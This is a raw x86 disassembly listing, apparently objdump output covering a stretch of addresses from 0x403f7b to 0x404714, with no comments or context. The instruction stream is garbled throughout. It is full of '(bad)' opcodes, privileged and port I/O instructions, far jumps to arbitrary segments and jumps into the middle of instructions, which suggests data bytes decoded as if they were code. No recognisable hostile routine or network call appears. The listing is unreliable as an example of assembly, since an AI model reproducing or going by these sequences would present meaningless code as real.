  403f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7c:	aam    0x6c
  403f7e:	aas    
  403f7f:	pop    ds
  403f80:	push   ecx
  403f81:	sub    eax,0x54104262
  403f86:	push   esp
  403f87:	mov    edi,0x547acc51
  403f8c:	pop    es
  403f8d:	je     0x403f8b
  403f8f:	mov    ebp,0xcb698db9
  403f94:	icebp  
  403f95:	sub    ecx,ebp
  403f97:	sbb    esi,esp
  403f99:	mov    al,0x52
  403f9b:	jne    0x403ffb
  403f9d:	cs push edi
  403f9f:	adc    cl,BYTE PTR [ebx+ebp*8+0x31]
  403fa3:	xor    al,0x34
  403fa5:	and    ebx,DWORD PTR [ebx]
  403fa7:	adc    eax,0x7d012866
  403fac:	xor    eax,0x61f42a5
  403fb1:	mov    dh,0x1e
  403fb3:	fsubr  DWORD PTR [ebx]
  403fb5:	iret   
  403fb6:	inc    ecx
  403fb7:	push   esp
  403fb8:	xchg   esp,eax
  403fb9:	pop    ss
  403fba:	in     eax,0x61
  403fbc:	mov    al,ds:0xeca6ed
  403fc1:	test   al,0x62
  403fc3:	inc    edi
  403fc4:	push   cs
  403fc5:	push   ebp
  403fc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fc7:	cmp    DWORD PTR [edx],ecx
  403fc9:	pusha  
  403fca:	dec    edx
  403fcb:	js     0x40403d
  403fcd:	js     0x403fe9
  403fcf:	jbe    0x403f59
  403fd1:	mov    eax,0x31fde222
  403fd6:	xor    al,cl
  403fd8:	mov    BYTE PTR [edi+0x9],dh
  403fdb:	in     eax,0x39
  403fdd:	xor    BYTE PTR [ebp+eax*4+0x424e5406],0xfd
  403fe5:	aam    0x3a
  403fe7:	jge    0x403fd3
  403fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403feb:	cld    
  403fec:	mul    BYTE PTR [ebx-0x1c]
  403fef:	xchg   ebp,eax
  403ff0:	ja     0x403fb2
  403ff2:	push   ecx
  403ff3:	fild   QWORD PTR ds:0x18bffddb
  403ff9:	dec    eax
  403ffa:	push   0x65
  403ffc:	fild   QWORD PTR [edi-0x73]
  403fff:	data16 lods al,BYTE PTR ds:[esi]
  404001:	ins    DWORD PTR es:[edi],dx
  404002:	mov    al,ds:0x6ecdca02
  404007:	push   ss
  404008:	jge    0x403f92
  40400a:	and    ah,bh
  40400c:	in     al,dx
  40400d:	xchg   ecx,eax
  40400e:	inc    ebx
  40400f:	cmp    al,BYTE PTR [ebx]
  404011:	mov    BYTE PTR [ecx+esi*4-0xd90aae1],bl
  404018:	sbb    BYTE PTR [edx+0x4f],al
  40401b:	jne    0x404018
  40401d:	jns    0x403fe4
  40401f:	pop    eax
  404020:	loopne 0x403fc7
  404022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404023:	dec    ebp
  404024:	mov    ds:0xb906daf4,al
  404029:	inc    ecx
  40402a:	and    BYTE PTR [edi+0x40],dh
  40402d:	sbb    al,0x1
  40402f:	xchg   DWORD PTR [ecx-0x46],ebp
  404032:	cmp    DWORD PTR [ebx+edi*2-0xb8ab8ca],edx
  404039:	dec    edx
  40403a:	std    
  40403b:	jmp    0x404034
  40403d:	mul    DWORD PTR [ebp+0x45]
  404040:	sti    
  404041:	sbb    DWORD PTR [edx+0x206abad6],ebx
  404047:	arpl   WORD PTR [eax-0x63f190a6],bx
  40404d:	out    dx,eax
  40404e:	sub    eax,0x54de2318
  404053:	shr    BYTE PTR [ecx+0x4],cl
  404056:	sar    BYTE PTR [ecx-0x1ed5da01],1
  40405c:	out    dx,al
  40405d:	(bad)  
  40405e:	xor    di,ax
  404061:	cmp    ecx,0x12c07ef2
  404067:	cmp    al,0x2
  404069:	sbb    edi,DWORD PTR [ebp+ebp*4+0x3]
  40406d:	ins    BYTE PTR es:[edi],dx
  40406e:	cdq    
  40406f:	mov    dh,0x2c
  404071:	mov    BYTE PTR [esi+0x5],cl
  404074:	add    DWORD PTR [edi+0x44],0x4133fd5
  40407b:	inc    esp
  40407c:	dec    ebx
  40407d:	stos   BYTE PTR es:[edi],al
  40407e:	pop    ds
  40407f:	or     bh,ah
  404081:	cmp    DWORD PTR [edx-0x4b424ca1],ebp
  404087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404088:	jge    0x4040d8
  40408a:	pop    ecx
  40408b:	mov    edx,0xa51e9e8e
  404090:	adc    eax,DWORD PTR [edi]
  404092:	dec    ebp
  404093:	(bad)  
  404095:	(bad)  
  404096:	or     BYTE PTR ds:0x83ecfb70,bh
  40409c:	rcl    BYTE PTR ss:[ebx-0x14be7ddd],0xb6
  4040a4:	(bad)  
  4040a6:	xor    BYTE PTR [edi],dl
  4040a8:	nop
  4040a9:	es xchg esi,eax
  4040ab:	(bad)  
  4040ac:	xor    eax,0xced6f00b
  4040b1:	leave  
  4040b2:	es inc ebp
  4040b4:	mov    al,0xe8
  4040b6:	(bad)  
  4040b8:	jecxz  0x4040c4
  4040ba:	xor    al,0x5f
  4040bc:	in     eax,dx
  4040bd:	(bad)  
  4040be:	lods   eax,DWORD PTR ds:[esi]
  4040bf:	jns    0x4040b9
  4040c1:	inc    ecx
  4040c2:	inc    edx
  4040c3:	lahf   
  4040c4:	pusha  
  4040c5:	retf   
  4040c6:	lods   eax,DWORD PTR ds:[esi]
  4040c7:	mov    ds,WORD PTR [ebp-0x37]
  4040ca:	pop    es
  4040cb:	pop    es
  4040cc:	dec    edi
  4040cd:	inc    esi
  4040ce:	sbb    ecx,DWORD PTR [ebp+0x73]
  4040d1:	lea    esp,[ecx+0x5]
  4040d4:	fdivrp st(6),st
  4040d6:	inc    esp
  4040d8:	mov    dl,BYTE PTR [ebp+0x32ec2d6d]
  4040de:	jge    0x4040ff
  4040e0:	in     eax,dx
  4040e1:	leave  
  4040e2:	loope  0x404138
  4040e4:	xor    BYTE PTR [edx],al
  4040e6:	repnz or edx,DWORD PTR [esi+edx*2-0x43]
  4040eb:	push   esp
  4040ec:	push   ebp
  4040ed:	mov    eax,0xc28207e4
  4040f2:	cmp    DWORD PTR ds:0x3a6ae4de,esi
  4040f8:	or     dl,BYTE PTR [ebx-0x3e]
  4040fb:	inc    ecx
  4040fc:	call   0xdbbda0e7
  404101:	outs   dx,BYTE PTR ds:[esi]
  404102:	sbb    al,0xe0
  404104:	leave  
  404105:	cmp    dh,BYTE PTR [esi]
  404107:	dec    esp
  404108:	pop    edi
  404109:	hlt    
  40410a:	pop    esi
  40410b:	mov    al,BYTE PTR [edx-0x3f37d19e]
  404111:	xchg   edx,eax
  404112:	cs adc al,0xa5
  404115:	mov    eax,0x1d63cd4f
  40411a:	cli    
  40411b:	cmp    eax,0xdaa1504
  404120:	ins    DWORD PTR es:[edi],dx
  404121:	fld    QWORD PTR ds:0x7e881be2
  404127:	push   ebx
  404128:	iret   
  404129:	in     al,0x48
  40412b:	or     DWORD PTR [eax+0x3288e55b],0xc34d2e9d
  404135:	test   al,0x2a
  404137:	jne    0x404176
  404139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40413a:	add    BYTE PTR [edx],ch
  40413c:	cmp    DWORD PTR [ebx-0x48],ebx
  40413f:	lds    edi,FWORD PTR [esi+ebp*8]
  404142:	mov    al,ds:0x85ab94a8
  404147:	or     esi,0x5a5dc026
  40414d:	das    
  40414e:	fdivr  DWORD PTR [edi+0x40506155]
  404154:	pop    ebx
  404155:	push   esi
  404156:	stos   BYTE PTR es:[edi],al
  404157:	and    al,0x9d
  404159:	mov    ebx,0xac25dc9b
  40415e:	or     ch,BYTE PTR [ebx]
  404160:	jno    0x404146
  404162:	cmp    al,0xf0
  404164:	adc    dh,BYTE PTR [edx-0x4238742]
  40416a:	mov    ds:0x5a613161,eax
  40416f:	cmp    ecx,ecx
  404171:	mov    ebx,0xf082b56b
  404176:	dec    ebx
  404177:	push   ss
  404178:	ins    BYTE PTR es:[edi],dx
  404179:	(bad)  
  40417a:	push   DWORD PTR [edi]
  40417c:	(bad)  
  40417e:	mov    esp,0xdf629a45
  404183:	xor    al,0x23
  404185:	and    eax,DWORD PTR [ebx*1+0x779a12fc]
  40418c:	jecxz  0x40412d
  40418e:	jmp    0x4041c2
  404190:	and    eax,0x24028497
  404195:	cwde   
  404196:	outs   dx,DWORD PTR ds:[esi]
  404197:	retf   0x42c9
  40419a:	(bad)  
  40419b:	iret   
  40419c:	ds imul dl
  40419f:	addr16 es (bad) 
  4041a2:	mov    ebp,0x811bc22a
  4041a7:	fsub   st,st(3)
  4041a9:	fprem1 
  4041ab:	cld    
  4041ac:	test   al,0xcf
  4041ae:	out    0x41,al
  4041b0:	push   0x0
  4041b2:	jmp    0x12e29c04
  4041b7:	invd   
  4041b9:	push   es
  4041ba:	inc    ebp
  4041bb:	push   ebx
  4041bc:	addr16 (bad) 
  4041be:	sbb    al,0x8d
  4041c0:	loopne 0x4041cd
  4041c2:	push   es
  4041c3:	ins    DWORD PTR es:[edi],dx
  4041c4:	shl    DWORD PTR [esi+0x48a86f48],1
  4041ca:	add    BYTE PTR [esi-0x310bb856],ah
  4041d0:	sbb    ch,bh
  4041d2:	jb     0x404172
  4041d4:	not    BYTE PTR [esi+edx*1+0x124e05a5]
  4041db:	pop    edx
  4041dc:	lods   al,BYTE PTR ds:[esi]
  4041dd:	jmp    0x94fa:0x73ea7f4d
  4041e4:	fcmovbe st,st(3)
  4041e6:	call   0x33e3:0x8bdbba39
  4041ed:	lods   al,BYTE PTR ds:[esi]
  4041ee:	inc    cl
  4041f0:	cmp    DWORD PTR [ebx+0x6],esi
  4041f3:	pusha  
  4041f4:	add    eax,0xe3da718d
  4041f9:	push   ds
  4041fa:	jbe    0x40424d
  4041fc:	dec    ecx
  4041fd:	mov    eax,ds:0x3567e0aa
  404202:	or     esi,DWORD PTR [eiz*4+0x3bbd767c]
  404209:	and    edi,DWORD PTR [edx-0x2b]
  40420c:	divps  xmm3,XMMWORD PTR [ebp+0x3e]
  404210:	push   0xffffff92
  404212:	jle    0x4041ef
  404214:	sub    DWORD PTR ds:0xa9848350,0xf06913f7
  40421e:	dec    ecx
  40421f:	sub    cl,BYTE PTR [ebp+0x5a979e55]
  404225:	or     esi,eax
  404227:	sub    edx,DWORD PTR [esi+0x10]
  40422a:	(bad)  
  40422b:	xor    BYTE PTR ds:0xc03df029,cl
  404231:	cmp    eax,DWORD PTR [esi-0x39]
  404234:	std    
  404235:	sbb    DWORD PTR [esi-0x58],edx
  404238:	loop   0x404278
  40423a:	dec    edx
  40423b:	xlat   BYTE PTR ds:[ebx]
  40423c:	ins    BYTE PTR es:[edi],dx
  40423d:	lods   al,BYTE PTR ds:[esi]
  40423e:	cmp    eax,0xcb6eac70
  404243:	jo     0x4042af
  404245:	jmp    0xf305:0xe1a9eff1
  40424c:	jl     0x40426e
  40424e:	push   cs
  40424f:	mov    esp,DWORD PTR [esp+edi*1]
  404252:	mov    dl,0xcd
  404254:	jo     0x4042bd
  404256:	les    eax,FWORD PTR [ebx+eiz*2]
  404259:	adc    DWORD PTR [eax-0x282a2406],esi
  40425f:	mov    ebx,0x881230bd
  404264:	rcl    DWORD PTR [ecx],0x59
  404267:	inc    esp
  404268:	sub    al,0x95
  40426a:	cmc    
  40426b:	push   ebx
  40426c:	adc    eax,0x1d2385d0
  404271:	inc    edx
  404272:	out    dx,eax
  404273:	adc    dh,0x5
  404276:	dec    esi
  404277:	aam    0xa8
  404279:	jb     0x4042df
  40427b:	sahf   
  40427c:	repnz enter 0xc702,0x39
  404281:	xlat   BYTE PTR ds:[ebx]
  404282:	sbb    cl,BYTE PTR [eax]
  404284:	pop    ecx
  404285:	xor    DWORD PTR [eax+0x551b7cb2],eax
  40428b:	adc    ebx,DWORD PTR [edx-0x6e]
  40428e:	fcmovne st,st(2)
  404290:	fisubr WORD PTR [edi-0xdad3d18]
  404296:	push   edx
  404297:	pop    esi
  404298:	add    bh,BYTE PTR [ebp-0xd]
  40429b:	lea    esi,[ebx-0x7e8b5029]
  4042a1:	xor    eax,0xad954c76
  4042a6:	imul   ebp,DWORD PTR [ebp-0xe],0x657a378e
  4042ad:	retf   0xa3ce
  4042b0:	loop   0x404254
  4042b2:	xor    eax,0x9de1e242
  4042b7:	shl    BYTE PTR ss:[edi],cl
  4042ba:	adc    esp,ebx
  4042bc:	dec    edx
  4042bd:	cmp    esp,esi
  4042bf:	ret    0xba76
  4042c2:	dec    BYTE PTR [edx]
  4042c4:	outs   dx,BYTE PTR ds:[esi]
  4042c5:	ds repnz dec eax
  4042c8:	add    edx,ebx
  4042ca:	add    BYTE PTR [eax-0x2c983b5e],ch
  4042d0:	(bad)  
  4042d1:	inc    ecx
  4042d2:	imul   ebx,esp,0xffffffea
  4042d5:	cmc    
  4042d6:	xchg   edx,eax
  4042d7:	lock mov BYTE PTR [edx+0x69],dl
  4042db:	sbb    edi,DWORD PTR [ebp+0x26]
  4042de:	aas    
  4042df:	lods   eax,DWORD PTR ds:[esi]
  4042e0:	lahf   
  4042e1:	adc    eax,0x8cf8bf27
  4042e6:	fwait
  4042e7:	ret    
  4042e8:	ja     0x404324
  4042ea:	dec    edi
  4042eb:	mov    edx,0xa15de417
  4042f0:	xor    ah,bh
  4042f2:	not    ebp
  4042f4:	out    dx,eax
  4042f5:	out    dx,al
  4042f6:	and    al,0x20
  4042f8:	(bad)  
  4042f9:	mov    esi,0x285b5c66
  4042fe:	mov    ch,0x59
  404300:	cmp    eax,0x6f7e8ce8
  404305:	mov    bh,0x9f
  404307:	cli    
  404308:	and    dl,BYTE PTR [edi]
  40430a:	mov    dl,BYTE PTR [edx+0xf8c3753]
  404310:	mov    esi,0xf1d08b12
  404315:	cs aas 
  404317:	xchg   DWORD PTR [ebp-0x50c91ece],edx
  40431d:	ins    DWORD PTR es:[edi],dx
  40431e:	jp     0x404354
  404320:	clc    
  404321:	adc    BYTE PTR [ebp+0x3d919233],ah
  404327:	or     eax,0x299469ad
  40432c:	jno    0x40437c
  40432e:	cdq    
  40432f:	aad    0x66
  404331:	mov    esp,0x71a9fa28
  404336:	addr16 pop edx
  404338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404339:	in     al,0xa9
  40433b:	mov    ebx,0xfbd192d3
  404340:	or     al,0x29
  404342:	pop    esi
  404343:	adc    eax,0x51c5f723
  404348:	jp     0x404376
  40434a:	inc    edi
  40434b:	xchg   ecx,eax
  40434c:	loop   0x40437f
  40434e:	or     BYTE PTR [ecx-0xb],0xe8
  404352:	je     0x4042ea
  404354:	lock inc eax
  404356:	repnz and DWORD PTR [ebp-0x6a],0x47
  40435b:	pop    es
  40435c:	or     bl,BYTE PTR [ecx]
  40435e:	js     0x4043b6
  404360:	xchg   esi,eax
  404361:	aad    0xe0
  404363:	in     eax,dx
  404364:	aas    
  404365:	pushf  
  404366:	and    dl,BYTE PTR [edx+0x1b]
  404369:	mov    ah,0xd5
  40436b:	adc    BYTE PTR [ecx+eax*4],bl
  40436e:	push   cs
  40436f:	mov    ebx,0x5cb6a724
  404374:	push   ebp
  404375:	xchg   edi,eax
  404376:	mov    BYTE PTR [eax],ch
  404378:	popf   
  404379:	cmp    DWORD PTR [ecx],ebx
  40437b:	hlt    
  40437c:	call   0xa066:0xc3d23b32
  404383:	and    al,0xd7
  404385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404386:	or     esi,edx
  404388:	mov    cl,BYTE PTR [ecx]
  40438a:	out    dx,eax
  40438b:	dec    esp
  40438c:	aaa    
  40438d:	xchg   ebp,eax
  40438e:	jmp    0x4dc4:0x3f8c28a3
  404395:	jno    0x404367
  404397:	mov    DWORD PTR [ebx-0x7acd5a78],esi
  40439d:	dec    edx
  40439e:	jb     0x404326
  4043a0:	and    bl,dl
  4043a2:	mov    bl,0x46
  4043a4:	inc    edx
  4043a5:	mov    ch,0x90
  4043a7:	inc    ebp
  4043a8:	push   ebx
  4043a9:	popf   
  4043aa:	or     eax,0x4778e489
  4043af:	add    DWORD PTR ds:0xc0ad0979,eax
  4043b5:	xor    DWORD PTR [edx],edx
  4043b7:	mov    cl,0xa4
  4043b9:	inc    ecx
  4043ba:	dec    eax
  4043bb:	imul   esi,DWORD PTR [esi+esi*2-0x12],0xdb40a05c
  4043c3:	ret    
  4043c4:	dec    esp
  4043c5:	add    edx,DWORD PTR [ecx]
  4043c7:	mov    eax,0x3e451415
  4043cc:	push   edi
  4043cd:	and    DWORD PTR [ebx],edi
  4043cf:	fnstcw WORD PTR [ebx]
  4043d1:	addr16 sti 
  4043d3:	cld    
  4043d4:	mov    ch,0xae
  4043d6:	in     al,dx
  4043d7:	add    al,0xd9
  4043d9:	mov    eax,ds:0x955c4c
  4043de:	push   ss
  4043df:	mov    esp,0xed9fa082
  4043e4:	push   ds
  4043e5:	into   
  4043e6:	int    0xbb
  4043e8:	inc    ecx
  4043e9:	mov    dl,0x83
  4043eb:	test   DWORD PTR [edi-0x3f],ebx
  4043ee:	(bad)  
  4043ef:	adc    ebp,DWORD PTR [ecx+0x1d]
  4043f2:	mov    ebx,0xa85cac06
  4043f7:	(bad)  
  4043f8:	cdq    
  4043f9:	test   DWORD PTR [si+0x70f0],0x61a71daf
  404402:	add    BYTE PTR [esi],cl
  404404:	adc    DWORD PTR [edi+0x5f],ebx
  404407:	arpl   WORD PTR [edx+0x65],ax
  40440a:	and    DWORD PTR [ebp+0x6e],ecx
  40440d:	test   DWORD PTR [edx+0x6664364c],eax
  404413:	adc    bh,BYTE PTR [ecx]
  404415:	pop    ebp
  404416:	adc    BYTE PTR [eax+0x70],ah
  404419:	ins    BYTE PTR es:[edi],dx
  40441a:	mov    dl,0x73
  40441c:	fstp   DWORD PTR [esi-0x4f]
  40441f:	ja     0x4043b2
  404421:	push   ecx
  404422:	or     al,0xaf
  404424:	rol    ecx,cl
  404426:	push   0xa8c1903e
  40442b:	mov    ds:0x54616102,eax
  404430:	sub    ecx,edx
  404432:	stc    
  404433:	adc    ebx,DWORD PTR [ecx+eiz*1]
  404436:	inc    edi
  404437:	loopne 0x40440e
  404439:	out    0x2b,eax
  40443b:	push   ss
  40443c:	ins    BYTE PTR es:[edi],dx
  40443d:	mov    bh,0xea
  40443f:	dec    ebx
  404440:	add    al,0x25
  404442:	add    eax,0xf4ddd2c0
  404447:	mov    bh,0xae
  404449:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40444a:	jl     0x4043d0
  40444c:	test   DWORD PTR [ecx-0x6],esp
  40444f:	sti    
  404450:	cmp    eax,0x6024fe1a
  404455:	aaa    
  404456:	adc    esp,DWORD PTR [edi-0x5aead52b]
  40445c:	(bad)  
  40445d:	or     al,0xcf
  40445f:	jae    0x4044dd
  404461:	(bad)  
  404462:	lods   al,BYTE PTR ds:[esi]
  404463:	repz mov edx,0xd4eb01da
  404469:	jno    0x404413
  40446b:	cmp    al,0x50
  40446d:	ins    DWORD PTR es:[edi],dx
  40446e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40446f:	sbb    BYTE PTR [edi],ah
  404471:	jnp    0x40446c
  404473:	stos   DWORD PTR es:[edi],eax
  404474:	rcl    DWORD PTR [ebp+0x1ee16268],0xee
  40447b:	loopne 0x4044db
  40447d:	sar    BYTE PTR [eax-0x41d0bfde],1
  404483:	(bad)  
  404484:	lock test eax,0xf3a2274f
  40448a:	xchg   esi,eax
  40448b:	mov    ebp,0x54890156
  404490:	cmp    cl,BYTE PTR [ebx]
  404492:	or     al,BYTE PTR [esi+0x7b]
  404495:	ins    BYTE PTR es:[edi],dx
  404496:	xor    al,BYTE PTR [eax+eiz*1-0x3979c7c8]
  40449d:	adc    BYTE PTR [edi],bl
  40449f:	mov    al,ds:0x292a16cb
  4044a4:	jl     0x40446c
  4044a6:	lock ins DWORD PTR es:[edi],dx
  4044a8:	jns    0x4044b3
  4044aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ab:	xchg   edx,eax
  4044ac:	addr16 retf 
  4044ae:	imul   esp,DWORD PTR [edi+0x152be4c3],0x40
  4044b5:	ja     0x404489
  4044b7:	loope  0x4044c1
  4044b9:	out    0xc1,eax
  4044bb:	ins    BYTE PTR es:[edi],dx
  4044bc:	(bad)  
  4044bd:	dec    edi
  4044be:	xchg   bh,bl
  4044c0:	inc    edi
  4044c1:	dec    esi
  4044c2:	dec    ebx
  4044c3:	shl    BYTE PTR ds:0x9739a52c,1
  4044c9:	retf   0xef01
  4044cc:	ffreep st(3)
  4044ce:	and    dl,dh
  4044d0:	pop    ebp
  4044d1:	loop   0x4044f6
  4044d3:	test   al,0xfb
  4044d5:	imul   edi,DWORD PTR [edx],0xffffffbc
  4044d8:	mov    cl,0x90
  4044da:	and    BYTE PTR [ebp-0x297eb72c],0xdb
  4044e1:	loopne 0x40453c
  4044e3:	mov    fs,WORD PTR [edi]
  4044e5:	pop    ecx
  4044e6:	dec    ebx
  4044e7:	sub    DWORD PTR [bx+si+0x1455],ebx
  4044ec:	jge    0x40447b
  4044ee:	mov    BYTE PTR [esi-0x1e],bl
  4044f1:	popa   
  4044f2:	xor    ecx,DWORD PTR [edx-0x72c02607]
  4044f8:	lods   eax,DWORD PTR ds:[esi]
  4044f9:	(bad)  
  4044fa:	aad    0x20
  4044fc:	lods   eax,DWORD PTR ds:[esi]
  4044fd:	gs xchg edi,eax
  4044ff:	loopne 0x4044a4
  404501:	enter  0xda02,0x92
  404505:	push   0x6100f5be
  40450a:	jge    0x4044d8
  40450c:	mov    BYTE PTR [ebp+0x6deb37],0xee
  404513:	rol    eax,0xe
  404516:	dec    ecx
  404517:	(bad)  
  404518:	mov    al,0x7a
  40451a:	das    
  40451b:	fcomp  DWORD PTR [edi]
  40451d:	ret    0x8e36
  404520:	add    DWORD PTR [edi],edx
  404522:	ja     0x404570
  404524:	ficom  DWORD PTR [eax]
  404526:	adc    BYTE PTR [ebx-0x41671fc6],ah
  40452c:	retf   0x70b0
  40452f:	out    0xaf,eax
  404531:	in     eax,0x97
  404533:	daa    
  404534:	jg     0x404562
  404536:	retf   0x4d10
  404539:	sbb    DWORD PTR [edi],0x26b72581
  40453f:	lds    esi,FWORD PTR [ecx-0x393ae085]
  404545:	add    eax,0x28624cf1
  40454a:	aad    0xfa
  40454c:	push   0x32
  40454e:	(bad)  
  40454f:	cmp    BYTE PTR [edi+0x7f],cl
  404552:	leave  
  404553:	sub    dl,ah
  404555:	mov    ds:0xad4efe3a,eax
  40455a:	inc    ebp
  40455b:	cs (bad) 
  40455d:	addr16 xchg edi,eax
  40455f:	inc    si
  404561:	aam    0x96
  404563:	mov    gs,edi
  404565:	fninit 
  404567:	fs pushf 
  404569:	cs inc ch
  40456c:	mov    cl,0xae
  40456e:	nop
  40456f:	xor    ah,BYTE PTR [ebx]
  404571:	sub    DWORD PTR [ebp+0x73f30962],ecx
  404577:	pop    edi
  404578:	adc    dh,BYTE PTR [edi]
  40457a:	mov    eax,0x1271739b
  40457f:	adc    esp,DWORD PTR [ebp+ecx*2+0x22]
  404583:	dec    ebx
  404584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404585:	retf   0x752
  404588:	pop    edx
  404589:	popa   
  40458a:	inc    edx
  40458b:	and    esp,DWORD PTR [ecx]
  40458d:	not    BYTE PTR [esi]
  40458f:	int3   
  404590:	sar    DWORD PTR [esi],1
  404592:	aam    0xab
  404594:	arpl   bx,sp
  404596:	jae    0x4045d5
  404598:	adc    BYTE PTR [ecx-0x304cca0b],al
  40459e:	sbb    DWORD PTR [ebx+0xe],ecx
  4045a1:	sahf   
  4045a2:	out    dx,eax
  4045a3:	and    ecx,ebp
  4045a5:	xor    dh,ch
  4045a7:	enter  0xae15,0x91
  4045ab:	cdq    
  4045ac:	bnd call 0xddd8bba7
  4045b2:	sub    dh,al
  4045b4:	push   0x77dfacac
  4045b9:	xchg   esi,eax
  4045ba:	(bad)  
  4045bb:	pop    ds
  4045bc:	jmp    0x34be3879
  4045c1:	jbe    0x4045ad
  4045c3:	test   al,0xcf
  4045c5:	add    DWORD PTR [edi+0x79],esi
  4045c8:	sub    ch,BYTE PTR [edx]
  4045ca:	(bad)  
  4045cb:	sub    edx,DWORD PTR [eax]
  4045cd:	jg     0x4045bc
  4045cf:	jl     0x4045de
  4045d1:	scas   al,BYTE PTR es:[edi]
  4045d2:	lahf   
  4045d3:	test   al,0x13
  4045d5:	sbb    BYTE PTR [edi+0x77],al
  4045d8:	cmp    bl,BYTE PTR [edx-0x22]
  4045db:	(bad)  
  4045dc:	js     0x40463b
  4045de:	(bad)  
  4045e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e1:	mov    eax,0x697cd783
  4045e6:	xchg   esp,eax
  4045e7:	mov    dh,0xd5
  4045e9:	mov    edi,0x6f3f0e61
  4045ee:	xchg   ecx,eax
  4045ef:	and    al,0x5d
  4045f1:	sub    dh,BYTE PTR [edi+0x68204291]
  4045f7:	(bad)  
  4045f8:	loope  0x4045d4
  4045fa:	(bad)  
  4045fb:	cmp    bl,BYTE PTR [ebx-0x2ca3966d]
  404601:	lea    eax,[ebp+0x61acbedd]
  404607:	sbb    dh,BYTE PTR [ebx-0x62798cbb]
  40460d:	or     al,0xc4
  40460f:	pusha  
  404610:	ins    DWORD PTR es:[edi],dx
  404611:	dec    ebx
  404612:	ret    
  404613:	mov    bl,0x47
  404615:	dec    eax
  404616:	popa   
  404617:	inc    esp
  404618:	test   al,0x65
  40461a:	into   
  40461b:	jmp    0xa952fb7a
  404620:	js     0x404606
  404622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404623:	dec    esi
  404624:	pop    es
  404625:	ret    0x87d
  404628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404629:	mov    bh,0xbf
  40462b:	and    eax,0xb6a6ee23
  404630:	adc    ebp,DWORD PTR [ecx+0x49b28771]
  404636:	push   0xb36a294d
  40463b:	fwait
  40463c:	push   es
  40463d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40463e:	sbb    DWORD PTR [eax],0xc3ad9c17
  404644:	jnp    0x4045e5
  404646:	arpl   WORD PTR [eax+0x5fd6a20c],dx
  40464c:	sti    
  40464d:	fsubr  st(2),st
  40464f:	mov    dl,0x7c
  404651:	fidivr DWORD PTR [edi]
  404653:	push   esp
  404654:	retf   0x6882
  404657:	mov    ds:0x7992daf4,al
  40465c:	push   eax
  40465d:	das    
  40465e:	pop    ds
  40465f:	or     DWORD PTR [edi+eax*1-0x1dad5a36],esp
  404666:	sub    edi,DWORD PTR fs:[ebp-0x5fe8f21d]
  40466d:	ror    DWORD PTR [edx+0x22],0x4e
  404671:	push   esi
  404672:	fwait
  404673:	and    DWORD PTR [edi],esi
  404675:	retf   
  404676:	xor    esi,DWORD PTR [esi+0x28]
  404679:	cld    
  40467a:	jecxz  0x4046a5
  40467c:	(bad)  
  40467d:	out    dx,eax
  40467e:	inc    esi
  40467f:	daa    
  404680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404681:	stc    
  404682:	dec    ebx
  404683:	repnz cmp eax,0x4bdc99f4
  404689:	xchg   BYTE PTR [ecx],al
  40468b:	lock outs dx,BYTE PTR ds:[esi]
  40468d:	lods   al,BYTE PTR ds:[esi]
  40468e:	inc    ebp
  40468f:	dec    edx
  404690:	cmp    al,0x1d
  404692:	(bad)  
  404693:	out    dx,al
  404694:	jb     0x40465e
  404696:	dec    ebp
  404697:	loope  0x404668
  404699:	xchg   esi,eax
  40469a:	jns    0x4046c4
  40469c:	jne    0x404668
  40469e:	jno    0x40466d
  4046a0:	cs jo  0x4046cc
  4046a3:	es scas al,BYTE PTR es:[edi]
  4046a5:	popf   
  4046a6:	sub    BYTE PTR [edx+esi*8],dh
  4046a9:	xchg   esp,eax
  4046aa:	stos   BYTE PTR es:[edi],al
  4046ab:	rol    BYTE PTR cs:[edx+ebx*8],cl
  4046af:	ja     0x4046ba
  4046b1:	sub    DWORD PTR [ebx+0x7a],esi
  4046b4:	pop    edi
  4046b5:	and    edi,ecx
  4046b7:	fwait
  4046b8:	in     al,dx
  4046b9:	aam    0xb5
  4046bb:	sub    BYTE PTR [edi-0x5f2e072],al
  4046c1:	fidivr DWORD PTR [eax-0x21]
  4046c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046c5:	std    
  4046c6:	inc    edx
  4046c7:	(bad)  
  4046c8:	cmp    DWORD PTR [esi+0x0],esi
  4046cb:	imul   eax,DWORD PTR [esi+0x1a],0xffffffda
  4046cf:	bound  edx,QWORD PTR [edi+0x27828db7]
  4046d5:	aas    
  4046d6:	test   DWORD PTR [ecx+0x55],0xfbf98bf4
  4046dd:	into   
  4046de:	jno    0x4046ab
  4046e0:	xor    DWORD PTR [edx],edx
  4046e2:	or     al,0x85
  4046e4:	aas    
  4046e5:	nop
  4046e6:	pop    ss
  4046e7:	xor    edx,DWORD PTR [edx+0x63]
  4046ea:	outs   dx,BYTE PTR ds:[esi]
  4046eb:	retf   
  4046ec:	adc    DWORD PTR [esi-0x66],esp
  4046ef:	int3   
  4046f0:	fwait
  4046f1:	mov    ?,eax
  4046f3:	int3   
  4046f4:	leave  
  4046f5:	cmp    esp,DWORD PTR [ebp+0x5e]
  4046f8:	ja     0x404733
  4046fa:	popa   
  4046fb:	adc    cl,ch
  4046fd:	pop    ss
  4046fe:	iret   
  4046ff:	in     al,dx
  404700:	cs dec eax
  404702:	push   0x49
  404704:	cli    
  404705:	inc    esi
  404706:	sub    al,0xf5
  404708:	add    eax,0x90ea3197
  40470d:	adc    ebp,DWORD PTR [eax-0x63da6f2a]
  404713:	push   esp
  404714:	inc    esp
